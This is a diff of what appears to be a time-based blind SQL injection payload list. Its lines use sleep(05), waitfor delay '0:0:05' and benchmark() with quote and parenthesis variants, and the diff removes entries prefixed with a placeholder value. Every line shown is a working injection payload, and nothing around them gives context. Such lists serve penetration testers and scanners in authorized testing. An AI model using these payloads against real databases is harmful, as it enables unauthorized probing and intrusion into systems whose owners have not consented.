@@ -1,5 +1,4 @@
 sleep(05)#
-[VALUE],sleep(05)#
 1 or sleep(05)#
 " or sleep(05)#
 ' or sleep(05)#
@@ -23,16 +22,12 @@ sleep(05)#
 ")) and sleep(05)="
 ')) and sleep(05)='
 ;waitfor delay '0:0:05'-- 
-[VALUE];waitfor delay '0:0:05'-- 
-[VALUE] waitfor delay '0:0:05'-- 
 );waitfor delay '0:0:05'-- 
-[VALUE]);waitfor delay '0:0:05'-- 
 ';waitfor delay '0:0:05'-- 
 ";waitfor delay '0:0:05'-- 
 ');waitfor delay '0:0:05'-- 
 ");waitfor delay '0:0:05'-- 
 ));waitfor delay '0:0:05'-- 
-[VALUE]));waitfor delay '0:0:05'-- 
 '));waitfor delay '0:0:05'-- 
 "));waitfor delay '0:0:05'-- 
 benchmark(10000000,MD5(1))#
